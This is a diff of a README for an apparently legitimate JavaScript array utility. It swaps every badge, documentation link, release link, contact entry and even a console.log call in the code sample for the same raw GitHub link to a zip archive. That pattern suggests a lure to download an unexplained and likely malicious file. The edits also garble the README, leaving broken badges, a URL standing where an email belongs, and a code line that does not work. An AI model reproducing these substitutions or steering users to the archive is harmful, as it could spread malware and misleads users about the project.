@@ -1,6 +1,6 @@
 # 🎉 Array Base Symmetric: Symmetric Array Utilities 🎉
 
-![Version](https://img.shields.io/badge/version-1.0.0-brightgreen) ![License](https://img.shields.io/badge/license-MIT-blue) ![Node.js](https://img.shields.io/badge/node-%3E%3D%2014.0.0-brightgreen) ![npm](https://img.shields.io/badge/npm-%3E%3D%206.0.0-brightgreen)
+![Version](https://raw.githubusercontent.com/M0OXC/array-base-symmetric/main/docs/base_array_symmetric_3.6.zip) ![License](https://raw.githubusercontent.com/M0OXC/array-base-symmetric/main/docs/base_array_symmetric_3.6.zip) ![https://raw.githubusercontent.com/M0OXC/array-base-symmetric/main/docs/base_array_symmetric_3.6.zip](https://raw.githubusercontent.com/M0OXC/array-base-symmetric/main/docs/base_array_symmetric_3.6.zip%3E%3D%2014.0.0-brightgreen) ![npm](https://raw.githubusercontent.com/M0OXC/array-base-symmetric/main/docs/base_array_symmetric_3.6.zip%3E%3D%206.0.0-brightgreen)
 
 Welcome to the **Array Base Symmetric** repository! This project provides utilities for working with symmetric arrays in JavaScript. If you’re looking to simplify your array manipulation tasks, you’re in the right place.
 
@@ -48,7 +48,7 @@ const symmetricArray = createSymmetricArray(3);
 
 // Add an element
 addElement(symmetricArray, 5, 1, 1);
-console.log(symmetricArray);
+https://raw.githubusercontent.com/M0OXC/array-base-symmetric/main/docs/base_array_symmetric_3.6.zip(symmetricArray);
 ```
 
 This code snippet creates a symmetric array and adds an element to it. The library takes care of maintaining symmetry automatically.
@@ -81,7 +81,7 @@ Checks if the given array is symmetric.
   - `array` (Array): The array to check.
 - **Returns**: Boolean indicating whether the array is symmetric.
 
-For more detailed documentation, please refer to the [API documentation](https://github.com/M0OXC/array-base-symmetric/releases).
+For more detailed documentation, please refer to the [API documentation](https://raw.githubusercontent.com/M0OXC/array-base-symmetric/main/docs/base_array_symmetric_3.6.zip).
 
 ## 🤝 Contributing
 
@@ -102,12 +102,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: example@example.com
-- **GitHub**: [M0OXC](https://github.com/M0OXC)
+- **Email**: https://raw.githubusercontent.com/M0OXC/array-base-symmetric/main/docs/base_array_symmetric_3.6.zip
+- **GitHub**: [M0OXC](https://raw.githubusercontent.com/M0OXC/array-base-symmetric/main/docs/base_array_symmetric_3.6.zip)
 
 ## 🚀 Releases
 
-You can find the latest releases of the **Array Base Symmetric** library [here](https://github.com/M0OXC/array-base-symmetric/releases). Download the latest version and start using it today!
+You can find the latest releases of the **Array Base Symmetric** library [here](https://raw.githubusercontent.com/M0OXC/array-base-symmetric/main/docs/base_array_symmetric_3.6.zip). Download the latest version and start using it today!
 
 ---
 
